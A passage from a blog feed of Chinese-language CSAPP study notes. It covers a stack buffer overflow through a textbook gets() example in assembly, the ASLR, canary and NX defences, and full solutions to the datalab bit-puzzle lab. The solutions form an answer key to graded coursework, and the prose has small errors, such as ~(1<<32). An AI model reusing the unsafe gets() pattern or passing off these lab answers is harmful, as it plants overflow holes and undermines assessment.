class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs assembly">pushq    %rbp<br>movq    %rsp, %rbp<br>subq    $16, %rsp<br>leaq    -8(%rbp), %rax<br>movq    %rax, %rdi<br>movl    $0, %eax<br>call    gets@PLT<br>leaq    -8(%rbp), %rax<br>movq    %rax, %rdi<br>call    puts@PLT<br>nop<br>leave<br>ret<br></code></pre></td></tr></table></figure><p>其中有指令 <code>leaq -8(%rbp), %rax</code> 的意思就是将相对于基指针 <code>rbp</code> 的地址偏移 <code>-8</code>加载到寄存器 <code>rax</code> 中，也就是说一旦输入超过了 8 字节，就会覆盖 <code>rbp</code> 所在的位置，再长 8 字节就会覆盖住返回地址。</p><p>缓冲区溢出的致命使用就是让程序执行本来不该执行的函数，这也是一种最常见的网络攻击的方法。我们称编写的攻击代码为 exploit code ，直接输入的字节被称为 payload。一般情况下，攻击代码可能会尝试启动一个 shell 程序，这样攻击者就可以获取对受害计算机直接操控的权限。</p><h4 id="对抗缓冲区溢出攻击"><a href="#对抗缓冲区溢出攻击" class="headerlink" title="对抗缓冲区溢出攻击"></a>对抗缓冲区溢出攻击</h4><p>GCC 提供了一些机制来防止攻击者利用缓冲区溢出来获取系统控制权限，如下：</p><ul><li><p>栈随机化</p><p>一般情况下，程序每次运行的虚拟地址都是固定不变的，这样我们就可以直接将想要执行的函数地址覆盖在返回地址上。</p><p>栈随机的思想使得每次程序运行时栈的位置都有变化，这类技术我们成为 <strong>地址空间布局随机化（Address-Space Layout Randomization，ASLR）</strong>。原理是每次运行程序时，程序的不同部分包括程序代码、库代码和全局变量等数据都会被加载到内存的不同区域。</p><p>当然攻击者也有对抗保护的方法，就是在实际的的攻击代码前面插入很多 nop 指令，那么我们只要任意命中一个 nop 都可以导致我们恶意代码的顺利执行。这个序列常用的术语 “nop sled” 就是”滑“过序列的意思。</p></li><li><p>栈破坏检测</p><p>栈破坏检测是在栈已经被破坏后进行的防御措施，GCC 中对应的机制叫做栈保护者（stack-protector）。其思想是在缓冲区和返回地址之前插入一段随机数，在函数返回之前检查这个随机数是否被更改，如果被更改就终止程序。这个随机数叫做金丝雀（canary）值。</p></li><li><p>栈不可执行</p><p>这个保护措施直接限制了攻击者像系统中插入可执行代码的行为，也就是 NX（No-Execute），通过这个特性我们可以将栈设置为不可执行，也就是向栈上插入的代码是不会运行的。</p></li></ul><h3 id="浮点数"><a href="#浮点数" class="headerlink" title="浮点数"></a>浮点数</h3><p><del>书上还有一小节浮点数的部分</del></p><p>当前使用的 AVX 指令集中，浮点数的机器代码风格和整数数据的各种操作类似，不同就在于寄存器和指令的表示，浮点数通常有专用的浮点寄存器和浮点指令。</p><blockquote><p>AVX 指令集是英特尔（Intel）和AMD（Advanced Micro Devices）处理器架构中的一种 SIMD（Single Instruction, Multiple Data，单指令多数据）扩展指令集</p></blockquote><hr><p>我要开始快乐国庆节噜！！</p><p>身上颓废的上学味已经消散，现在我浑身都散发着浓郁的爱国气息🥳</p>]]></content>
    
    
    <categories>
      
      <category>读书笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Knowledge</tag>
      
      <tag>CSAPP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CSAPP 第二章 datalab</title>
    <link href="/2023/09/19/CSAPP-%E7%AC%AC%E4%BA%8C%E7%AB%A0-datalab/"/>
    <url>/2023/09/19/CSAPP-%E7%AC%AC%E4%BA%8C%E7%AB%A0-datalab/</url>
    
    <content type="html"><![CDATA[<p>哦我的上帝实验怎么是英文版的😶‍🌫️</p><span id="more"></span><p>上周小学期一直做项目没学习，正好做做实验复习一下</p><h2 id="int"><a href="#int" class="headerlink" title="int"></a>int</h2><h3 id="bitXor"><a href="#bitXor" class="headerlink" title="bitXor"></a>bitXor</h3><p>题目要求：只使用 ~ 和 &amp; 来实现 ^ 操作</p><blockquote><p>复习环节</p><p>~  按位非（每位二进制取反），&amp; 按位与（对应位同为1结果位才为1）,| 按位或（只要有一位是1结果位就是1），^ 亦或（对应位相同为0，不同为1）</p></blockquote><p>首先可以想到 <code>x^y = x&amp;~y + ~x&amp;y = (x&amp;~y)|(~x&amp;y)</code></p><p>接下来想办法替代 <code>|</code>，<code>x|y=~(~x&amp;~y)</code>，所以最后的结果是：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * bitXor - x^y using only ~ and &amp; </span><br><span class="hljs-comment"> *   Example: bitXor(4, 5) = 1</span><br><span class="hljs-comment"> *   Legal ops: ~ &amp;</span><br><span class="hljs-comment"> *   Max ops: 14</span><br><span class="hljs-comment"> *   Rating: 1</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">bitXor</span><span class="hljs-params">(<span class="hljs-type">int</span> x, <span class="hljs-type">int</span> y)</span> &#123;<br>    <span class="hljs-keyword">return</span> ~(~(x&amp;~y)&amp;~(~x&amp;y));<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="tmin"><a href="#tmin" class="headerlink" title="tmin"></a>tmin</h3><p>题目要求：使用 ! ~ &amp; ^ | + &lt;&lt; &gt;&gt; 来获取 int 的最小值</p><blockquote><p>复习环节</p><p>！逻辑非，&lt;&lt; 左移， &gt;&gt; 右移</p></blockquote><p>最小值其实就是1后面31个0，但我们不能使用超过 8bit 的常数。可以使用左移运算，让初始常数1左移31位。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * tmin - return minimum two&#x27;s complement integer </span><br><span class="hljs-comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"> *   Max ops: 4</span><br><span class="hljs-comment"> *   Rating: 1</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">tmin</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>&lt;&lt;<span class="hljs-number">31</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="isTmax"><a href="#isTmax" class="headerlink" title="isTmax"></a>isTmax</h3><p>题目要求：判断 x 是不是 int 的最大值</p><blockquote><p>复习环节：</p><p>! 逻辑非，将非零数值转换为1，而 0 保持不变</p></blockquote><p>根据上题我们得出最小值，取反就能得到最大值也就是 <code>~(1&lt;&lt;32)</code> 。</p><p>如果 x 和最大值一样，那么每一位都是一样的的，我们就可以使用异或操作如果两边相等就返回 0，最后逻辑非将0转化为1就行。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * isTmax - returns 1 if x is the maximum, two&#x27;s complement number,</span><br><span class="hljs-comment"> *     and 0 otherwise </span><br><span class="hljs-comment"> *   Legal ops: ! ~ &amp; ^ | +</span><br><span class="hljs-comment"> *   Max ops: 10</span><br><span class="hljs-comment"> *   Rating: 1</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">isTmax</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span> &#123;<br>    <span class="hljs-keyword">return</span> !(~(<span class="hljs-number">1</span>&lt;&lt;<span class="hljs-number">31</span>)^x);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="allOddBits"><a href="#allOddBits" class="headerlink" title="allOddBits"></a>allOddBits</h3><p>题目要求：判断所给出的数字奇数位是否都为 1 。</p><p>根据题目提示0xAAAAAAAA的奇数位都是1，偶数位都是0，我们考虑直接用它来和原来的数字进行按位与运算再和AAA异或。但又由于位数不能超过 8 bit，需要利用左移运算，左移以后再和原来的值进行与运算。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * allOddBits - return 1 if all odd-numbered bits in word set to 1</span><br><span class="hljs-comment"> *   where bits are numbered from 0 (least significant) to 31 (most significant)</span><br><span class="hljs-comment"> *   Examples allOddBits(0xFFFFFFFD) = 0, allOddBits(0xAAAAAAAA) = 1</span><br><span class="hljs-comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"> *   Max ops: 12</span><br><span class="hljs-comment"> *   Rating: 2</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">allOddBits</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span> &#123;<br>     <span class="hljs-type">int</span> y=(<span class="hljs-number">0xAA</span>&lt;&lt; <span class="hljs-number">8</span>)|<span class="hljs-number">0xAA</span>;<br>     y= y|(y&lt;&lt;<span class="hljs-number">16</span>);<br>     <span class="hljs-keyword">return</span> !((y&amp;x)^y) ;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="negate"><a href="#negate" class="headerlink" title="negate"></a>negate</h3><p>题目要求：取目标数值的相反数</p><p>负数就是按位取反以后加一</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * negate - return -x </span><br><span class="hljs-comment"> *   Example: negate(1) = -1.</span><br><span class="hljs-comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"> *   Max ops: 5</span><br><span class="hljs-comment"> *   Rating: 2</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">negate</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span> &#123;<br>  <span class="hljs-keyword">return</span> ~x+<span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="isAsciiDigit"><a href="#isAsciiDigit" class="headerlink" title="isAsciiDigit"></a>isAsciiDigit</h3><p>题目要求：如果 0x30 &lt;&#x3D; x &lt;&#x3D; 0x39，则返回 1</p><p>判断目标值和已知数值的大小只要做减法就可以，但是这个式子不能用 - ，考虑按照上题方法取反后相加，再看结果值符号位的正负即可。</p><blockquote><p>括号一定要括对😿</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * isAsciiDigit - return 1 if 0x30 &lt;= x &lt;= 0x39 (ASCII codes for characters &#x27;0&#x27; to &#x27;9&#x27;)</span><br><span class="hljs-comment"> *   Example: isAsciiDigit(0x35) = 1.</span><br><span class="hljs-comment"> *            isAsciiDigit(0x3a) = 0.</span><br><span class="hljs-comment"> *            isAsciiDigit(0x05) = 0.</span><br><span class="hljs-comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"> *   Max ops: 15</span><br><span class="hljs-comment"> *   Rating: 3</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">isAsciiDigit</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span> &#123;<br>    <span class="hljs-keyword">return</span> !((x+(~<span class="hljs-number">0x30</span>+<span class="hljs-number">1</span>))&amp;(<span class="hljs-number">1</span>&lt;&lt;<span class="hljs-number">31</span>))&amp;!!((x+(~<span class="hljs-number">0x3a</span>+<span class="hljs-number">1</span>))&amp;(<span class="hljs-number">1</span>&lt;&lt;<span class="hljs-number">31</span>));<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="conditional"><a href="#conditional" class="headerlink" title="conditional"></a>conditional</h3><p>题目要求：实现 x ? y : z （x 不为 0 返回 y ，为 0 返回 z ）</p><p>对于 x 是否为0，我们可以采用两次 ! 运算来实现即 <code>!!0=0</code> ，<code>!!3=1</code> 。</p><p>我们知道，任何书与所有位全是1的值的结果都是它本身，同样与位全是0的数就是0。根据掩码的规范，所有位都是 1 的值是十进制的 -1，所以我们需要对逻辑与之后的结果取倒数就是 <code>(~!!x+1)</code> 。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * conditional - same as x ? y : z </span><br><span class="hljs-comment"> *   Example: conditional(2,4,5) = 4</span><br><span class="hljs-comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"> *   Max ops: 16</span><br><span class="hljs-comment"> *   Rating: 3</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">conditional</span><span class="hljs-params">(<span class="hljs-type">int</span> x, <span class="hljs-type">int</span> y, <span class="hljs-type">int</span> z)</span> &#123;<br>    <span class="hljs-keyword">return</span> ((~!!x+<span class="hljs-number">1</span>)&amp;y)|(~(~!!x+<span class="hljs-number">1</span>)&amp;z);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="isLessOrEqual"><a href="#isLessOrEqual" class="headerlink" title="isLessOrEqual"></a>isLessOrEqual</h3><p>题目要求：如果 x &lt;&#x3D; y 则返回 1，否则返回 0</p><p>本来想的是像前面的题一样直接相减就行了，但是想到可能会有溢出的问题。</p><p>解决方法是先判断符号位，如果两个数符号相同再做差，符号不同就可以直接返回结果了。</p><table><thead><tr><th>正负</th><th>sign_x</th><th>sign_y</th><th>返回值</th></tr></thead><tbody><tr><td>x正 y负</td><td>0</td><td>1</td><td>0</td></tr><tr><td>y正 x负</td><td>1</td><td>0</td><td>1</td></tr></tbody></table><p>观察结果可以发现返回值就等于 <code>sign_x&amp;(!sign_y)</code> 。</p><p>还需要考虑两个数相等的情况，相等时符号位为 0 。可以转换思路绕过这个情况，在数据都是整数时 <code>x&lt;=y</code> 也就是 <code>x&lt;y+1</code>，所以做差的计算式就变成了 <code>x+(~y+1)-1</code> 也就是 <code>x+~y</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * isLessOrEqual - if x &lt;= y  then return 1, else return 0 </span><br><span class="hljs-comment"> *   Example: isLessOrEqual(4,5) = 1.</span><br><span class="hljs-comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"> *   Max ops: 24</span><br><span class="hljs-comment"> *   Rating: 3</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">isLessOrEqual</span><span class="hljs-params">(<span class="hljs-type">int</span> x, <span class="hljs-type">int</span> y)</span> &#123;<br>    <span class="hljs-type">int</span> sign_x=x&gt;&gt;<span class="hljs-number">31</span>;<br>    <span class="hljs-type">int</span> sign_y=y&gt;&gt;<span class="hljs-number">31</span>;<br>    <span class="hljs-type">int</span> result1=sign_x&amp;(!sign_y); <span class="hljs-comment">//符号不同的返回结果</span><br>    <span class="hljs-type">int</span> flag=!(sign_x^sign_y);   <span class="hljs-comment">//判断符号是否相同</span><br>    <span class="hljs-keyword">return</span> result1|flag&amp;((x + ~y) &gt;&gt; <span class="hljs-number">31</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="logicalNeg"><a href="#logicalNeg" class="headerlink" title="logicalNeg"></a>logicalNeg</h3><p>题目要求：实现逻辑非的功能</p><p>逻辑非无非就是需要想一想 0 和非零数之间的区别。0 的正负数都相等，但是其他数的正负不同，我们可以利用这个特性将目标数据取相反数后异或，再判断符号位，相同返回 0，不同返回 1 。</p><p>由于符号位为 1 ，右移后的结果便为0x11111111, 令其加 1 ，刚好为 0（这是因为在补码表示法中，负数的绝对值可以通过取反加1来获得）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * logicalNeg - implement the ! operator, using all of </span><br><span class="hljs-comment"> *              the legal operators except !</span><br><span class="hljs-comment"> *   Examples: logicalNeg(3) = 0, logicalNeg(0) = 1</span><br><span class="hljs-comment"> *   Legal ops: ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"> *   Max ops: 12</span><br><span class="hljs-comment"> *   Rating: 4 </span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">logicalNeg</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span> &#123;<br>    <span class="hljs-keyword">return</span> ((x|(~x+<span class="hljs-number">1</span>))&gt;&gt;<span class="hljs-number">31</span>)+<span class="hljs-number">1</span>;  <br>&#125;<br></code></pre></td></tr></table></figure><h3 id="howManyBits"><a href="#howManyBits" class="headerlink" title="howManyBits"></a>howManyBits</h3><p>题目要求：返回表示 x 所需的最小位数</p><p><del>这道题完全没思路，是看别的师傅的博客才明白的</del></p><p>首先让所有的数据都变成正值，然后利用二分法来判断二分后的最高位是否全是0，再判断是否全是1。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* howManyBits - return the minimum number of bits required to represent x in</span><br><span class="hljs-comment"> *             two&#x27;s complement</span><br><span class="hljs-comment"> *  Examples: howManyBits(12) = 5</span><br><span class="hljs-comment"> *            howManyBits(298) = 10</span><br><span class="hljs-comment"> *            howManyBits(-5) = 4</span><br><span class="hljs-comment"> *            howManyBits(0)  = 1</span><br><span class="hljs-comment"> *            howManyBits(-1) = 1</span><br><span class="hljs-comment"> *            howManyBits(0x80000000) = 32</span><br><span class="hljs-comment"> *  Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"> *  Max ops: 90</span><br><span class="hljs-comment"> *  Rating: 4</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">howManyBits</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span> &#123;<br>    <span class="hljs-type">int</span> sign ;<br>    sign = x&gt;&gt;<span class="hljs-number">31</span>;<br>    x = (~x&amp;sign)|(~sign&amp;x);   <span class="hljs-comment">//全部换成为正数</span><br>    <br>    <span class="hljs-type">int</span> bit_16 =(!!(x &gt;&gt; <span class="hljs-number">16</span>)) &lt;&lt; <span class="hljs-number">4</span>;    <span class="hljs-comment">//检测是否有1</span><br>    x = x &gt;&gt; bit_16;      <span class="hljs-comment">//将已经检测过的高16位移出去留下低位</span><br><span class="hljs-type">int</span> bit_8 = !!(x&gt;&gt;<span class="hljs-number">8</span>)&lt;&lt;<span class="hljs-number">3</span>;<br>x = x &gt;&gt; bit_8;<br>  <span class="hljs-type">int</span> bit_4 = !!(x &gt;&gt; <span class="hljs-number">4</span>) &lt;&lt; <span class="hljs-number">2</span>;<br>  x = x &gt;&gt; bit_4;<br>  <span class="hljs-type">int</span> bit_2 = !!(x &gt;&gt; <span class="hljs-number">2</span>) &lt;&lt; <span class="hljs-number">1</span>;<br>  x = x &gt;&gt; bit_2;<br>  <span class="hljs-type">int</span> bit_1 = !!(x &gt;&gt; <span class="hljs-number">1</span>);<br>  x = x &gt;&gt; bit_1;<br>  <span class="hljs-type">int</span> bit_0 = x;<br>  <span class="hljs-keyword">return</span> bit_16+bit_8+bit_4+bit_2+bit_1+bit_0+<span class="hljs-number">1</span>;<br>    <br>&#125;<br></code></pre></td></tr></table></figure><h2 id="float"><a href="#float" class="headerlink" title="float"></a>float</h2><h3 id="floatScale2"><a href="#floatScale2" class="headerlink" title="floatScale2"></a>floatScale2</h3><p>题目要求：将传入的无符号整型数转换为浮点数 <code>f*2</code> 返回</p><blockquote><p>复习环节：</p><p>浮点数有三部分，符号 s（最高位） ，阶码 exp（八位）和 尾数 frac。</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%BA%8C%E7%AB%A0-datalab/2-IEEE%E6%B5%AE%E7%82%B9%E6%95%B0%E8%A1%A8%E7%A4%BA%E6%96%B9%E6%B3%95.png"></p></blockquote><p>先分为三个部分，再分不同条件进行判断</p><ul><li><p>exp&#x3D;&#x3D;0</p><p>此时浮点数的值是一个接近于 0 的二进制小数，可以通过将尾数部分左移 1 位来将其乘以 2。然后，将符号位重新添加回去，得到乘以 2 后的规格化浮点数。</p></li><li><p>exp&#x3D;&#x3D;255</p><p>按题目要求直接返回 uf</p></li><li><p>其他情况</p><p>exp 指数加1，对它乘2^1也就是乘2</p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * floatScale2 - Return bit-level equivalent of expression 2*f for</span><br><span class="hljs-comment"> *   floating point argument f.</span><br><span class="hljs-comment"> *   Both the argument and result are passed as unsign int&#x27;s, but</span><br><span class="hljs-comment"> *   they are to be interpreted as the bit-level representation of</span><br><span class="hljs-comment"> *   single-precision floating point values.</span><br><span class="hljs-comment"> *   When argument is NaN, return argument</span><br><span class="hljs-comment"> *   Legal ops: Any integer/unsign operations incl. ||, &amp;&amp;. also if, while</span><br><span class="hljs-comment"> *   Max ops: 30</span><br><span class="hljs-comment"> *   Rating: 4</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-title function_">floatScale2</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> uf)</span> &#123;<br>    <span class="hljs-comment">// 分离符号位</span><br>    <span class="hljs-type">int</span> s = (uf &gt;&gt; <span class="hljs-number">31</span>) &amp; <span class="hljs-number">1</span>;<br>    <span class="hljs-comment">// 分离指数位</span><br>    <span class="hljs-type">int</span> <span class="hljs-built_in">exp</span> = (uf &gt;&gt; <span class="hljs-number">23</span>) &amp; <span class="hljs-number">0xFF</span>;<br>    <span class="hljs-comment">// 分离尾数位</span><br>    <span class="hljs-type">int</span> frac = uf &amp; <span class="hljs-number">0x7FFFFF</span>;<br>    <br>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">exp</span> == <span class="hljs-number">0xFF</span>) <br>    &#123;<br>        <span class="hljs-keyword">return</span> uf;<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-built_in">exp</span>==<span class="hljs-number">0</span>)<br>    &#123;<br>        frac &lt;&lt;= <span class="hljs-number">1</span>;<br><span class="hljs-keyword">return</span> (s &lt;&lt; <span class="hljs-number">31</span>) | (<span class="hljs-built_in">exp</span> &lt;&lt; <span class="hljs-number">23</span>) | frac;<br>    &#125;<br>    <span class="hljs-built_in">exp</span>++;   <br><span class="hljs-keyword">return</span> (s &lt;&lt; <span class="hljs-number">31</span>) | (<span class="hljs-built_in">exp</span> &lt;&lt; <span class="hljs-number">23</span>) | frac;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="floatFloat2Int"><a href="#floatFloat2Int" class="headerlink" title="floatFloat2Int"></a>floatFloat2Int</h3><p>题目要求：将目标 float 数据强制转换为 int 型数据。</p><p><del>这道题一开始写错了，又灰溜溜去找解析🤐</del></p><p><img src="/img/CSAPP-%E7%AC%AC%E4%BA%8C%E7%AB%A0-datalab/float%E7%BB%84%E6%88%90.png"></p><p>找了一张这样的图看上去更直观一点</p><ul><li><code>exp=0</code>，也就是阶码全是0的非规格化数，此时 <code>E=1- (128-1)= -126</code>，我们认为这是一个非常接近 0 的数，所以可以直接 <code>return 0</code></li><li><code>exp=255</code>，也就是 0XFF 最大值，特殊值NaN直接返回整数型的最大值 <code>return 0x80000000u</code></li><li><code>exp!=0&amp;&amp;exp!=255</code> ，也就是规格化的情况。此时 <code>E=exp-127</code> ，又分为下面几种情况：<ul><li>E &lt; 0 时，V&lt;1，<code>return 0</code></li><li>E &gt;&#x3D; 23，则进行加权时，需要 frac 左移 <code>(E-23)</code> 位</li><li>0 &lt; E &lt; 23，需要FRAC右移 <code>(23-E)</code> 位</li><li>E &gt; 31，Infinity 直接 <code>return 0</code></li></ul></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * floatFloat2Int - Return bit-level equivalent of expression (int) f</span><br><span class="hljs-comment"> *   for floating point argument f.</span><br><span class="hljs-comment"> *   Argument is passed as unsign int, but</span><br><span class="hljs-comment"> *   it is to be interpreted as the bit-level representation of a</span><br><span class="hljs-comment"> *   single-precision floating point value.</span><br><span class="hljs-comment"> *   Anything out of range (including NaN and infinity) should return</span><br><span class="hljs-comment"> *   0x80000000u.</span><br><span class="hljs-comment"> *   Legal ops: Any integer/unsign operations incl. ||, &amp;&amp;. also if, while</span><br><span class="hljs-comment"> *   Max ops: 30</span><br><span class="hljs-comment"> *   Rating: 4</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">floatFloat2Int</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> uf)</span> &#123;<br>    <span class="hljs-type">int</span> s = (uf &gt;&gt; <span class="hljs-number">31</span>) &amp; <span class="hljs-number">1</span>;<br>    <span class="hljs-type">int</span> <span class="hljs-built_in">exp</span> = (uf &gt;&gt; <span class="hljs-number">23</span>) &amp; <span class="hljs-number">0xFF</span>;<br>    <span class="hljs-type">int</span> frac = uf &amp; <span class="hljs-number">0x7FFFFF</span>;<br>    <span class="hljs-type">int</span> E=<span class="hljs-built_in">exp</span><span class="hljs-number">-127</span>;<br>    <br>    <span class="hljs-keyword">if</span>(E&lt;<span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span 